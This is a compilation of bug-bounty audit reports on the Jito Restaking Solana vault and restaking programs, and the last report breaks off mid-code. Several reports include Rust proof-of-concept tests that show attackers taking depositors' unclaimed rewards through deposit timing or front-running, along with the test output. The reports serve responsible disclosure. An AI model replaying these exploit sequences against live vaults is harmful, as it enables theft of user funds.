1.  [Jito Restaking](/jito-restaking)

#36675 \[SC-Insight\] Missing revoke instruction leads to Old delegate accounts have unlimited number
=====================================================================================================

**Submitted on Nov 10th 2024 at 19:00:49 UTC by @shanb1605 for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

*   **Report ID:** #36675
    
*   **Report Type:** Smart Contract
    
*   **Report severity:** Insight
    
*   **Target:** https://github.com/jito-foundation/restaking/tree/master/restaking\_program
    
*   **Impacts:**
    
    *   Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
        
    

Description


---------------

_**Exact Affected Files:**_

https://github.com/jito-foundation/restaking/blob/master/restaking\_program/src/ncn\_delegate\_token\_account.rs

https://github.com/jito-foundation/restaking/blob/master/restaking\_program/src/operator\_delegate\_token\_account.rs

https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/delegate\_token\_account.rs

Brief/Intro


---------------

The Restaking program has delegating token process for both NCN and Operator. Also, Vault program has a process for token delegation. These three process delegates the token to delegate account, which is authorized by the delegate admin.

When the `approve` instruction from SPL token 2022 program is called inside these process, it approves unlimited token allowance to delegate account. This allowance stays, even delegate admin changes the delegate account.

Since, there is no specific instruction or inbuilt instruction to revoke the old approvals, the past delegates have still some allowance left and has a chance to steal the tokens from the owner by past malicious delegates.

Vulnerability Details


-------------------------

Unlimited token approval take place in the three process. _**ncn\_delegate\_token\_account.rs**_ https://github.com/jito-foundation/restaking/blob/master/restaking\_program/src/ncn\_delegate\_token\_account.rs#L62-L69

_**Operator\_delegate\_token\_account.rs**_ https://github.com/jito-foundation/restaking/blob/master/restaking\_program/src/operator\_delegate\_token\_account.rs#L62-L69

_**delegate\_token\_account.rs (Vault program)**_ https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/delegate\_token\_account.rs#L65-L72

The issue is not unlimited approvals, rather than missing instruction for revoking approvals inside those files or separate process function to revoke the approval from Old delegate account.

To describe the vulnerability, here is the necessary assumption:

1.  The NCN/Operator/Vault delegate admin has approved Alice as token delegate account for some time.
    
2.  On some occurrence, the delegate admin wishes to change the delegate account.
    
3.  Now, the NCN/Operator/Vault delegate admin has approved Bob as token delegate account.
    
4.  Alice notices, the initial call for allowance is set to U64 Max allowance, and there is still allowance amount is left.
    
5.  Alice, the Old delegate turns out be malicious and spends all remaining token allowance.
    

Impact Details


------------------

The impact labelled as _**direct theft of user funds**_, as the report clearly states that past delegates have still some allowance amount left, and they are able to spend/steal the amount.

I searched for any revoke instruction written as separate process, it is not viable on in-scope repo. Since, there is missing revoke instruction, the allowance for old delegates stays forever on-chain leading to possible unauthorized spend.

References


--------------

The Solana staking documentation mentions deactivating the stake delegations must be one of the operations by the authority. https://solana.com/docs/economics/staking/stake-accounts#understanding-account-authorities

Recommendation(s)


---------------------

Consider adding revoke functionality from SPL token 2022 program: https://docs.rs/spl-token-2022/latest/spl\_token\_2022/instruction/fn.revoke.html

It could be added in affected files or kept as separate process function.

Link to Proof of Concept


----------------------------

https://gist.github.com/shanb1605/f11146e17f72880e0a5e30b53549b4ec

Proof of Concept


--------------------

Proof of Concept


--------------------

POC demonstrates the assumptions stated in _**Vulnerability Description**_

Make sure everything is set up through cloning the repo: https://github.com/jito-foundation/restaking/tree/master

There is no specific instruction for viewing allowance, so the code logs the allowance amount from state variable after executing each process for Alice and Bob.

Add this snippet to /integration\_tests/tests/restaking/ncn\_delegate\_token\_account.rs https://gist.github.com/shanb1605/f11146e17f72880e0a5e30b53549b4ec#file-ncn\_delegate\_token\_account-rs

Add this snippet to /integration\_tests/tests/restaking/Operator\_delegate\_token\_account.rs https://gist.github.com/shanb1605/f11146e17f72880e0a5e30b53549b4ec#file-operator\_delegate\_token\_account-rs

Add this snippet to /integration\_tests/tests/vault/delegate\_token\_account.rs https://gist.github.com/shanb1605/f11146e17f72880e0a5e30b53549b4ec#file-delegate\_token\_account-rs

Each step possess different commands to run, _**follow the snippet's comment on Line no: 1**_ to run the POC

[PreviousJito Restaking](/jito-restaking)[Next#37315 \[SC-High\] Theft of Unclaimed Yields Due to Improper Reward Distribution in Vault Program](/jito-restaking/37315-sc-high-theft-of-unclaimed-yields-due-to-improper-reward-distribution-in-vault-program)

1.  [Jito Restaking](/jito-restaking)

#37315 \[SC-High\] Theft of Unclaimed Yields Due to Improper Reward Distribution in Vault Program
=================================================================================================

**Submitted on Dec 2nd 2024 at 06:40:54 UTC by @GlitchLens for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

*   **Report ID:** #37315
    
*   **Report Type:** Smart Contract
    
*   **Report severity:** High
    
*   **Target:** https://github.com/jito-foundation/restaking/tree/master/vault\_program
    
*   **Impacts:**
    
    *   Theft of unclaimed yield
        
    

Description


---------------

Brief/Intro


---------------

The vault program suffers from a vulnerability in its reward distribution mechanism where the `UpdateVaultBalance` function is not enforced before minting or other actions involving `vault.deposited_tokens`. This allows an attacker to mint tokens immediately after rewards are deposited but before the balance update, enabling them to unfairly claim a portion of the rewards they did not contribute to. Exploiting this could result in financial losses for legitimate depositors and enable theft of unclaimed yields.

Vulnerability Details


-------------------------

The vulnerability lies in the lack of enforcement for calling `UpdateVaultBalance` before performing operations like `mint_to`. This causes an inaccurate calculation of rewards:

1.  When rewards are deposited into the vault, they are initially unclaimed and stored in the vault's token account.
    
2.  If a new depositor mints tokens before the balance update, they are included in the reward distribution calculation.
    
3.  This results in the redistribution of existing rewards, allowing the new depositor to claim unclaimed yields they are not entitled to.
    

For example:

*   Depositor1 deposits 10,000 tokens.
    
*   Rewards of 1,000 tokens are added to the vault, intended entirely for Depositor1.
    
*   Depositor2 mints tokens before `UpdateVaultBalance` is called.
    
*   The rewards are recalculated to include Depositor2, diverting a portion of Depositor1's rightful share.
    

Impact Details


------------------

*   **Theft of Unclaimed Yield:** Attackers can exploit the system to claim rewards they did not contribute to, directly stealing unclaimed yields.
    
*   **Financial Loss:** Legitimate depositors lose a portion of their entitled rewards, resulting in direct monetary losses.
    

References


--------------

https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/mint\_to.rs https://github.com/jito-foundation/restaking/blob/master/vault\_program/src/update\_vault\_balance.rs

Proof of Concept


--------------------

Proof of Concept


--------------------

In the provided PoC:

*   Depositor1 deposits 10,000 tokens and is entitled to 1,000 tokens in rewards.
    
*   Depositor2 mints an equivalent amount before `UpdateVaultBalance` is called.
    
*   Upon withdrawal, Depositor1 receives only 10,500 tokens instead of the expected 11,000, demonstrating a loss of 500 tokens due to theft of unclaimed yield.
    

yield\_theft.rs

```
#[cfg(test)] mod tests {  use jito_vault_core::config::Config; use solana_sdk::{signature::Keypair, signer::Signer}; use spl_associated_token_account::get_associated_token_address;   use crate::fixtures::{ fixture::{ConfiguredVault, TestBuilder}, vault_client::VaultStakerWithdrawalTicketRoot, };   const MINT_AMOUNT: u64 = 10000; const REWARD_AMOUNT: u64 = 1000;   #[tokio::test] async fn test_update_vault_balance_ok() { let deposit_fee_bps = 0; let reward_fee_bps = 0; let withdrawal_fee_bps = 0;   let num_operators = 1; let slasher_amounts = vec![];   let mut fixture = TestBuilder::new().await;   println!("=============================================="); println!("Setting up vault with 0 fees.."); let ConfiguredVault { mut vault_program_client, restaking_program_client: _, vault_config_admin: _, vault_root, restaking_config_admin: _, operator_roots, } = fixture .setup_vault_with_ncn_and_operators( deposit_fee_bps, withdrawal_fee_bps, reward_fee_bps, num_operators, &slasher_amounts, ) .await .unwrap();   println!("Vault setup complete!"); println!("=============================================="); println!("Depositor1 sets up their account and mint ${}..", MINT_AMOUNT);   let config = vault_program_client .get_config(&Config::find_program_address(&jito_vault_program::id()).0) .await .unwrap();   let depositor1 = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &depositor1.pubkey(), MINT_AMOUNT) .await .unwrap();   vault_program_client .do_mint_to(&vault_root, &depositor1, MINT_AMOUNT, MINT_AMOUNT) .await .unwrap();   println!("Depositor1 setup complete!"); println!("=============================================="); println!("Emulate reward accumulation. This reward should go to depositor1, since it's generated from their funds.."); println!("Reward amount: ${}", REWARD_AMOUNT); let reward_depositor = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &reward_depositor.pubkey(), REWARD_AMOUNT) .await .unwrap();   vault_program_client .create_and_fund_reward_vault(&vault_root.vault_pubkey, &reward_depositor, REWARD_AMOUNT) .await .unwrap(); println!("Reward funded!!");   println!("=============================================="); println!("Exploit begins.."); println!("Depositor2 joins immediately after seeing the reward deposit, and effectively `steals` half of the reward.."); let depositor2 = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &depositor2.pubkey(), MINT_AMOUNT) .await .unwrap();   vault_program_client .do_mint_to(&vault_root, &depositor2, MINT_AMOUNT, MINT_AMOUNT) .await .unwrap();   println!("Exploit done! Update will confirms the theft"); println!("=============================================="); println!("Update vault balance.."); vault_program_client .update_vault_balance(&vault_root.vault_pubkey) .await .unwrap();   println!("Update complete!"); println!("=============================================="); println!("Depositor 1 wants to withdraw their share"); let VaultStakerWithdrawalTicketRoot { base } = vault_program_client .do_enqueue_withdrawal(&vault_root, &depositor1, MINT_AMOUNT) .await .unwrap();   println!("Wait for epoch changes.."); fixture .warp_slot_incremental(config.epoch_length() * 2) .await .unwrap();   vault_program_client .do_full_vault_update( &vault_root.vault_pubkey, &[operator_roots[0].operator_pubkey], ) .await .unwrap();   println!("Depositor1 withdraws their share.."); vault_program_client .do_burn_withdrawal_ticket(&vault_root, &depositor1, &base, &config.program_fee_wallet) .await .unwrap();   let vault = vault_program_client .get_vault(&vault_root.vault_pubkey) .await .unwrap();   let depositor_token_account = fixture .get_token_account(&get_associated_token_address( &depositor1.pubkey(), &vault.supported_mint, )) .await .unwrap();  println!("Withdrawal complete!"); println!("=============================================="); println!("The reward should all belong to depositor1 (since fee == 0)"); println!("Current balance: ${}", depositor_token_account.amount); println!("Expected balance: ${}", MINT_AMOUNT + REWARD_AMOUNT); println!("==============================================");   assert_eq!(depositor_token_account.amount, MINT_AMOUNT + REWARD_AMOUNT); } }
```

running the poc with `cargo test` give the following output

```
---- poc::yield_theft::tests::test_update_vault_balance_ok stdout ---- ============================================== Setting up vault with 0 fees.. Vault setup complete! ============================================== Depositor1 sets up their account and mint $10000.. Depositor1 setup complete! ============================================== Emulate reward accumulation. This reward should go to depositor1, since it's generated from their funds.. Reward amount: $1000 Reward funded!! ============================================== Exploit begins.. Depositor2 joins immediately after seeing the reward deposit, and effectively `steals` half of the reward.. Exploit done! Update will confirms the theft ============================================== Update vault balance.. Update complete! ============================================== Depositor 1 wants to withdraw their share Wait for epoch changes.. Depositor1 withdraws their share.. Withdrawal complete! ============================================== The reward should all belong to depositor1 (since fee == 0) Current balance: $10500 Expected balance: $11000 ============================================== thread 'poc::yield_theft::tests::test_update_vault_balance_ok' panicked at integration_tests/tests/poc/yield_theft.rs:152:9: assertion `left == right` failed  left: 10500 right: 11000
```

[Previous#36675 \[SC-Insight\] Missing revoke instruction leads to Old delegate accounts have unlimited number](/jito-restaking/36675-sc-insight-missing-revoke-instruction-leads-to-old-delegate-accounts-have-unlimited-number-of)[Next#36787 \[SC-Insight\] The vault program don't support token2022 transfer](/jito-restaking/36787-sc-insight-the-vault-program-dont-support-token2022-transfer)


1.  [Jito Restaking](/jito-restaking)

#36787 \[SC-Insight\] The vault program don't support token2022 transfer
========================================================================

**Submitted on Nov 14th 2024 at 12:17:58 UTC by @Hoverfly9132 for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

*   **Report ID:** #36787
    
*   **Report Type:** Smart Contract
    
*   **Report severity:** Insight
    
*   **Target:** https://github.com/jito-foundation/restaking/tree/master/vault\_program
    
*   **Impacts:**
    
    *   Smart contract unable to operate due to lack of token funds
        
    

Description


---------------

Bug Description


-------------------

From the competition page we can know the vault program should support SPL token 2022:

`The Vault and Restaking programs support the SPL Token and SPL Token 2022 standards`.

But when calling `process_mint()` instruction, the token program id is hardcoded to be `spl_token` and not `spl_token_2022`. The spl token and spl token 2022 have different program id, the SPL token program id is `TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA` and SPL token 2022 program id is `TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb`, you can see the decalre for [`spl_token program id`](https://github.com/solana-labs/solana-program-library/blob/2d795f15287f6a0907bfe68f3fa252e30ee9572b/token/program/src/lib.rs#L85-L85) and [`spl_token_2022 program id`](https://github.com/solana-labs/solana-program-library/blob/2d795f15287f6a0907bfe68f3fa252e30ee9572b/token/program-2022/src/lib.rs#L95-L95).

```
pub  fn  process_mint(  program_id:  &Pubkey, accounts:  &[AccountInfo], amount_in:  u64, min_amount_out:  u64, ) ->  ProgramResult {  ... // transfer tokens from depositor to vault { invoke( &transfer( // @audit - hardcoded spl token program id &spl_token::id(), depositor_token_account.key, vault_token_account.key, depositor.key, &[], amount_in, )?, &[ depositor_token_account.clone(), vault_token_account.clone(), depositor.clone(), ], )?; } ... }
```

If the users transfer SPL token2022 to the vault by calling the `process_mint()` instruction, the transfer will fail because wrong token program id.

And in the `process_initialize_vault()` instruction, the token program id is loaded by `load_token_program()`, this function will check the token program id is `spl_token` or not, if not, it will return an error:

```
pub fn load_token_program(info: &AccountInfo) -> Result<(), ProgramError> {  if info.key.ne(&spl_token::id()) { msg!("Account is not the spl token program"); return Err(ProgramError::IncorrectProgramId); }   Ok(()) }
```

So the vault program doesn't support SPL token2022 init.

Impact


----------

The vault program doesn't support SPL token 2022 init and transfer.

Recommendation


------------------

Add the SPL token2022 feature to the vault program.

Proof of Concept


--------------------

Proof of Concept


--------------------

Place the case in the `vault_program/src/` path, run it by `cargo test --package jito-vault-program --lib -- test_token2022_basic`:

```
use solana_program::{  pubkey::Pubkey, system_instruction, }; use spl_token_2022::{  instruction::{initialize_mint, initialize_account, mint_to, transfer_checked}, state::{Mint, Account}, extension::{ExtensionType, StateWithExtensions}, ID as TOKEN_2022_ID, }; use solana_program_test::*; use solana_sdk::{  signature::Keypair, signer::Signer, transaction::Transaction, };   #[tokio::test] async fn test_token2022_basic_transfer() {  let mut program_test = ProgramTest::new( "spl_token_2022", TOKEN_2022_ID, processor!(spl_token_2022::processor::Processor::process), ); program_test.prefer_bpf(false);   let mut context = program_test.start_with_context().await; let payer = &context.payer; let mint_authority = Keypair::new(); let mint = Keypair::new(); let owner = Keypair::new(); let recipient = Keypair::new();   // Create a regular Token-2022 mint let mint_size = ExtensionType::try_calculate_account_len::<Mint>(&[]).unwrap(); let mint_rent = context.banks_client.get_rent().await.unwrap().minimum_balance(mint_size);   let transaction = Transaction::new_signed_with_payer( &[ system_instruction::create_account( &payer.pubkey(), &mint.pubkey(), mint_rent, mint_size as u64, &TOKEN_2022_ID, ), initialize_mint( &TOKEN_2022_ID, &mint.pubkey(), &mint_authority.pubkey(), Some(&mint_authority.pubkey()), 9, ).unwrap(), ], Some(&payer.pubkey()), &[payer, &mint], context.last_blockhash, ); context.banks_client.process_transaction(transaction).await.unwrap();   // Create accounts and mint tokens let account_size = ExtensionType::try_calculate_account_len::<Account>(&[]).unwrap(); let rent: u64 = context.banks_client.get_rent().await.unwrap().minimum_balance(account_size);   // Source account let source_account = Keypair::new(); let transaction = Transaction::new_signed_with_payer( &[ system_instruction::create_account( &payer.pubkey(), &source_account.pubkey(), rent, account_size as u64, &TOKEN_2022_ID, ), initialize_account( &TOKEN_2022_ID, &source_account.pubkey(), &mint.pubkey(), &owner.pubkey(), ).unwrap(), ], Some(&payer.pubkey()), &[payer, &source_account], context.last_blockhash, ); context.banks_client.process_transaction(transaction).await.unwrap();   // Mint tokens const MINT_AMOUNT: u64 = 1_000_000; let transaction = Transaction::new_signed_with_payer( &[mint_to( &TOKEN_2022_ID, &mint.pubkey(), &source_account.pubkey(), &mint_authority.pubkey(), &[], MINT_AMOUNT, ).unwrap()], Some(&payer.pubkey()), &[payer, &mint_authority], context.last_blockhash, ); context.banks_client.process_transaction(transaction).await.unwrap();   // Destination account let destination_account = Keypair::new(); let transaction = Transaction::new_signed_with_payer( &[ system_instruction::create_account( &payer.pubkey(), &destination_account.pubkey(), rent, account_size as u64, &TOKEN_2022_ID, ), initialize_account( &TOKEN_2022_ID, &destination_account.pubkey(), &mint.pubkey(), &recipient.pubkey(), ).unwrap(), ], Some(&payer.pubkey()), &[payer, &destination_account], context.last_blockhash, ); context.banks_client.process_transaction(transaction).await.unwrap();   // Transfer using Token-2022 const TRANSFER_AMOUNT: u64 = 100_000; let transaction = Transaction::new_signed_with_payer( &[transfer_checked( &TOKEN_2022_ID, &source_account.pubkey(), &mint.pubkey(), &destination_account.pubkey(), &owner.pubkey(), &[], TRANSFER_AMOUNT, 9, ).unwrap()], Some(&payer.pubkey()), &[payer, &owner], context.last_blockhash, ); context.banks_client.process_transaction(transaction).await.unwrap();   // Try SPL Token transfer (should fail) let spl_transfer = Transaction::new_signed_with_payer( &[spl_token::instruction::transfer( &spl_token::id(), &source_account.pubkey(), &destination_account.pubkey(), &owner.pubkey(), &[], TRANSFER_AMOUNT, ).unwrap()], Some(&payer.pubkey()), &[payer, &owner], context.last_blockhash, ); let result = context.banks_client.process_transaction(spl_transfer).await; assert!(result.is_err());   // Verify balances let source = context.banks_client.get_account(source_account.pubkey()).await.unwrap().unwrap(); let destination = context.banks_client.get_account(destination_account.pubkey()).await.unwrap().unwrap();   let source_token = StateWithExtensions::<Account>::unpack(&source.data).unwrap(); let destination_token = StateWithExtensions::<Account>::unpack(&destination.data).unwrap();   assert_eq!(source_token.base.amount, MINT_AMOUNT - TRANSFER_AMOUNT); assert_eq!(destination_token.base.amount, TRANSFER_AMOUNT); } 
```


1.  [Jito Restaking](/jito-restaking)

#36903 \[SC-High\] The vault reward mechanism can be sandwiched by MEV
======================================================================

**Submitted on Nov 19th 2024 at 10:35:35 UTC by @Hoverfly9132 for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

*   **Report ID:** #36903
    
*   **Report Type:** Smart Contract
    
*   **Report severity:** High
    
*   **Target:** https://github.com/jito-foundation/restaking/tree/master/vault\_program
    
*   **Impacts:**
    
    *   Theft of unclaimed yield
        
    

Description


---------------

Brief/Intro


---------------

The vault reward mechanism can be sandwiched by MEV to gain profits.

Vulnerability Details


-------------------------

When any SPL tokens are rewarded to the vault, the vault will update the VRT and total deposited amounts after calculating the reward fee:

```
// 1. Calculate reward fee in ST pub  fn  process_update_vault_balance(  program_id:  &Pubkey, accounts:  &[AccountInfo], ) ->  ProgramResult {  ... let st_rewards = new_st_balance.saturating_sub(vault.tokens_deposited()); let st_reward_fee = vault.calculate_st_reward_fee(new_st_balance)?;   // 2. Increment ST less the reward fee let st_balance_after_fees = new_st_balance .checked_sub(st_reward_fee) .ok_or(VaultError::ArithmeticUnderflow)?; // @audit - update the vault's ST balance vault.set_tokens_deposited(st_balance_after_fees);   // 3. Calculate the reward fee in VRT let vrt_reward_fee = vault.calculate_vrt_mint_amount(st_reward_fee)?;   // 4. Update State, with the vrt fee and the new st balance vault.set_tokens_deposited(new_st_balance); // @audit - increment the vault's VRT supply with the `vrt_reward_fee`. vault.increment_vrt_supply(vrt_reward_fee)?; ... }
```

This instruction will update the vault's VRT and total deposited amounts, if the increased total deposited amounts greater than the increased VRT supply, the exchange rate when burning the VRT: `total_deposited/VRT` will be increased, such that any users can redeem more ST with the same amount of VRT.

For example, both the total deposited amounts and VRT supply are `100000`, so the exchange rate is 1:1 at first, whether minting or burning VRT.

If some SPL tokens are rewarded to the vault with `10000`, reward fee is `1%`, the `st_reward_fee = 110000 * 1% = 1100`, the total deposited amounts will be updated to `110000 - 1100 = 108900`, the `vrt_reward_fee = 1100 * 100000/108900 = 1010`, so the new VRT supply will be `100000 + 1010 = 101010`. When users withdraw SPL tokens with VRT at this time, the exchange rate between SPL token and VRT supply is `108900/101010 ~= 1.078` greater than 1, so any users can gain profits by sandwich when the supported SPL tokens are rewarded to the vault.

Impact


----------

The vault reward mechanism can be sandwiched by MEV to gain profits from other users' yield.

Severity: High, because any MEV can gain profits from other users' yield, belong to `Theft of unclaimed yield` impact scope, also can be found in [immunefi-vulnerability-severity-classification-system-v2-3](https://immunefi.com/immunefi-vulnerability-severity-classification-system-v2-3/).

Recommendation


------------------

Implement a lock-up period for new deposited users, this should prevent any users can withdraw SPL tokens immediately after the SPL tokens are rewarded to the vault.

Or distriubute the rewards based on the time of the deposit, the longer the deposit time, the more rewards will be distributed.

Proof of Concept


--------------------

Proof of Concept


--------------------

This is a PoC of the above issue, please see the comments for the detailed steps, insert the case to `integration_tests/tests/vault/burn_withdrawal_ticket.rs` file then run `cargo-build-sbf && SBF_OUT_DIR=$(pwd)/target/sbf-solana-solana/release cargo nextest run --all-features test_burn_withdrawal_ticket_basic_success_with_update_vault_balance --verbose`:

```
 #[tokio::test] async fn test_burn_withdrawal_ticket_basic_success_with_update_vault_balance() {  const MINT_AMOUNT: u64 = 100_000; const WITHDRAWAL_AMOUNT: u64 = 10_000;   let deposit_fee_bps = 0; let withdraw_fee_bps = 0; // set reward_fee_bps -> 1% let reward_fee_bps = 100; let num_operators = 1; let slasher_amounts = vec![];   let mut fixture = TestBuilder::new().await; let ConfiguredVault { mut vault_program_client, restaking_program_client: _, vault_config_admin: _, vault_root, restaking_config_admin: _, operator_roots, } = fixture .setup_vault_with_ncn_and_operators( deposit_fee_bps, withdraw_fee_bps, reward_fee_bps, num_operators, &slasher_amounts, ) .await .unwrap();   // 1. initial deposit + mint to the depositor with MINT_AMOUNT and delegate all funds to the operator let depositor = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &depositor.pubkey(), MINT_AMOUNT) .await .unwrap(); vault_program_client .do_mint_to(&vault_root, &depositor, MINT_AMOUNT, MINT_AMOUNT) .await .unwrap();   vault_program_client .do_add_delegation(&vault_root, &operator_roots[0].operator_pubkey, MINT_AMOUNT) .await .unwrap();   // 2. attacker monitor some rewarders is sending spl tokens to the vault as rewards in the mempool, // and front-run the rewarders txs, initial deposit + mint to the attacker with WITHDRAWAL_AMOUNT let attacker = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &attacker.pubkey(), WITHDRAWAL_AMOUNT) .await .unwrap(); vault_program_client .do_mint_to(&vault_root, &attacker, WITHDRAWAL_AMOUNT, WITHDRAWAL_AMOUNT) .await .unwrap();   // 3. rewarder transfer spl token reward to the vault with MINT_AMOUNT/10 let rewarder: Keypair = Keypair::new(); vault_program_client .configure_depositor(&vault_root, &rewarder.pubkey(), MINT_AMOUNT/3) .await .unwrap();   vault_program_client .create_and_fund_reward_vault(&vault_root.vault_pubkey, &rewarder, MINT_AMOUNT/10) .await .unwrap();   // 4. Attacker initiate enqueue withdrawal with WITHDRAWAL_AMOUNT let VaultStakerWithdrawalTicketRoot { base } = vault_program_client .do_enqueue_withdrawal(&vault_root, &attacker, WITHDRAWAL_AMOUNT) .await .unwrap();   vault_program_client .do_cooldown_delegation(&vault_root, &operator_roots[0].operator_pubkey, WITHDRAWAL_AMOUNT) .await .unwrap();   // 5. Waiting for epochs to pass let config = vault_program_client .get_config(&Config::find_program_address(&jito_vault_program::id()).0) .await .unwrap();   fixture .warp_slot_incremental(config.epoch_length()) .await .unwrap(); vault_program_client .do_full_vault_update( &vault_root.vault_pubkey, &[operator_roots[0].operator_pubkey], ) .await .unwrap(); fixture .warp_slot_incremental(config.epoch_length()) .await .unwrap(); vault_program_client .do_full_vault_update( &vault_root.vault_pubkey, &[operator_roots[0].operator_pubkey], ) .await .unwrap();   vault_program_client .do_burn_withdrawal_ticket(&vault_root, &attacker, &base, &config.program_fee_wallet) .await .unwrap();  // 6. check the amounts of the attacker's token account let vault = vault_program_client .get_vault(&vault_root.vault_pubkey) .await .unwrap();   let attacker_token_account = fixture .get_token_account(&get_associated_token_address( &attacker.pubkey(), &vault.supported_mint, )) .await .unwrap();  // attacker mint VRT with 10000 spl tokens at first, then withdraw spl tokens with 10000 VRT, 10000 * 120000/110091 = 10900 > WITHDRAWAL_AMOUNT. assert_eq!(attacker_token_account.amount, WITHDRAWAL_AMOUNT + 900); }
```

[Previous#36787 \[SC-Insight\] The vault program don't support token2022 transfer](/jito-restaking/36787-sc-insight-the-vault-program-dont-support-token2022-transfer)[Next#37079 \[SC-Insight\] Withdrawals can be DOSed by reviving tickets in the same burn tx](/jito-restaking/37079-sc-insight-withdrawals-can-be-dosed-by-reviving-tickets-in-the-same-burn-tx)

1.  [Jito Restaking](/jito-restaking)

#37311 \[SC-High\] Attackers can steal rewards by depositing, updating vault balance and withdrawing i
======================================================================================================

**Submitted on Dec 2nd 2024 at 05:47:34 UTC by @niroh for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

*   **Report ID:** #37311
    
*   **Report Type:** Smart Contract
    
*   **Report severity:** High
    
*   **Target:** https://github.com/jito-foundation/restaking/tree/master/vault\_program
    
*   **Impacts:**
    
    *   Theft of unclaimed yield
        
    

Description


---------------

Brief/Intro


---------------

When ST rewards are sent to a vault, the vault's vrt\_token (shares) accrues the reward value only after a call to the update\_vault\_balance. The reward value accrues all at once after the update\_vault\_balance call. This enables an attack vector where a parasitic staker drains a large reward without contributing to the stake that produced the reward.

Vulnerability Details


-------------------------

Attack scenario:

1.  The vault has 10\_000 ST deposits that have been staked for a cetrain period of time. The vault has a vrt\_tokens supply of 10\_000 that represents current stakers shares in the vault.
    
2.  At epoc X, an ST reward of 1000 ST is sent to the vault as a reward for the staking so far.
    
3.  An attacker who monitors the protocol identifies the deposit and immediately sends a transaction that does the following: A. completes a vault tracker update (without a balance update) B. deposits 1\_000\_000 ST to the vault, for which they receive 1\_000\_000 vrt\_tokens. C. calls update\_vault\_balance D. enqueues a withdrawal ticket for the entire 1\_000\_000 vrt\_tokens received in the deposit.
    
4.  At epoc X+2 the attacker's withdrawal matures and they can claim their 1\_000\_000 vrt\_tokens for which they receive 1000990 ST tokens
    
5.  The attacker walks away with 99% of the reward that belongs to the original depositors. (see POC)
    
6.  Note that because the attacker immediately enqueues a withdrawal, their funds can not be delegated. This is becuase the vault::delegate function "reserves" ST funds for all enqueues/pending/ready withdrawals and will fail attempts to delegate beyond that. As can be seen in the code below:
    

```
//vault.rs line 1144 pub  fn  delegate(&mut self, amount:  u64) ->  Result<(), VaultError> {  if amount ==  0 { msg!("Delegation amount is zero"); return  Err(VaultError::VaultDelegationZero); } else  if self.tokens_deposited() ==  0  || self.vrt_supply() ==  0 { msg!("No tokens deposited in vault"); return  Err(VaultError::VaultUnderflow); }   // there is some protection built-in to the vault to avoid over delegating assets // this number is denominated in the supported token units let amount_to_reserve_for_vrts = self.calculate_supported_assets_requested_for_withdrawal()?;
```

This means that the attacker funds are never used for delegation and only "leech" on the rewards generated by other stakers.

Impact Details


------------------

Theft of unclaim yield (vault rewards) from stakers. Depending on the vault's TVL at the time of attack and on the attacker's funding, they can drain the majority of the reward (shown in the POC)

Recommendation


------------------

mint\_to (deposit) instruction should update\_vault\_balance before calculating the reveived vrt\_tokens.

References


--------------

https://github.com/jito-foundation/restaking/blob/406903e569da657035a2ca71ad16f8a930db6940/vault\_program/src/update\_vault\_balance.rs#L12

Proof of Concept


--------------------

Proof of Concept


--------------------

1.  add to folloing function to integration\_test/tests/fixtures/vault\_client.rs (same as do\_full\_vault\_update only without calling update\_balance. required for the exploiter move)
    

```
pub async fn do_full_vault_update_no_balance(  &mut self, vault_pubkey: &Pubkey, operators: &[Pubkey], ) -> Result<(), TestError> { let slot = self.banks_client.get_sysvar::<Clock>().await?.slot;   let config = self .get_config(&Config::find_program_address(&jito_vault_program::id()).0) .await?;   let ncn_epoch = slot / config.epoch_length();   let vault_update_state_tracker = VaultUpdateStateTracker::find_program_address( &jito_vault_program::id(), vault_pubkey, ncn_epoch, ) .0; self.initialize_vault_update_state_tracker(vault_pubkey, &vault_update_state_tracker) .await?;   for i in 0..operators.len() { let operator_index = (i + ncn_epoch as usize) % operators.len(); let operator = &operators[operator_index]; self.crank_vault_update_state_tracker( vault_pubkey, operator, &VaultOperatorDelegation::find_program_address( &jito_vault_program::id(), vault_pubkey, operator, ) .0, &vault_update_state_tracker, ) .await?; }   self.close_vault_update_state_tracker( vault_pubkey, &vault_update_state_tracker, slot / config.epoch_length(), ) .await?;   Ok(()) } 
```

1.  Add the following code to a test file under integration\_tests/tests/vault/
    

```
#[cfg(test)] mod tests {  //use jito_vault_sdk::error::VaultError; use solana_sdk::signature::{Keypair, Signer}; use jito_vault_core::{config::Config, vault::BurnSummary, vault_staker_withdrawal_ticket::VaultStakerWithdrawalTicket};  use crate::fixtures::fixture::{ConfiguredVault, TestBuilder}; use spl_associated_token_account::get_associated_token_address;  #[tokio::test] async fn exploit_steal_rewards() { let mut fixture = TestBuilder::new().await;   let deposit_fee_bps = 0; let withdrawal_fee_bps = 0; let reward_fee_bps = 0; let num_operators = 1; let slasher_amounts = vec![];   let (ConfiguredVault { mut vault_program_client, mut restaking_program_client, vault_root, operator_roots, .. }) = fixture .setup_vault_with_ncn_and_operators( deposit_fee_bps, withdrawal_fee_bps, reward_fee_bps, num_operators, &slasher_amounts,  ) .await .unwrap();  //get config data let mut config = vault_program_client .get_config(&Config::find_program_address(&jito_vault_program::id()).0) .await .unwrap();  //get vault let mut vault = vault_program_client.get_vault(&vault_root.vault_pubkey).await.unwrap(); let vault_vrt_fee_wallet = &get_associated_token_address(&vault.fee_wallet, &vault.vrt_mint); //create a supported mint account to the vault admin since they are also the fee wallet and need to be able to receive STs vault_program_client.create_ata(&vault.supported_mint, &vault_root.vault_admin.pubkey()).await.unwrap();   //get operator keys let operator_pubkeys: Vec<_> = operator_roots .iter() .map(|root| root.operator_pubkey) .collect();  //create  exploiter let exploiter_deposit_amount = 